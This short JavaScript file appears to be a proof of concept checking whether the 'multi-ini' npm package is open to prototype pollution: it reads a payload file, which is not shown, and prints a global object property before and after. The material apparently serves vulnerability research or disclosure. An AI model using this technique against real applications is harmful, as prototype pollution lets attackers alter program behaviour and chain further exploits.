var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const ini = require('multi-ini');
const path = require('path');
console.log({}.polluted);
ini.read(path.resolve(__dirname, './payload.toml'), { encoding: 'utf8' });
console.log({}.polluted);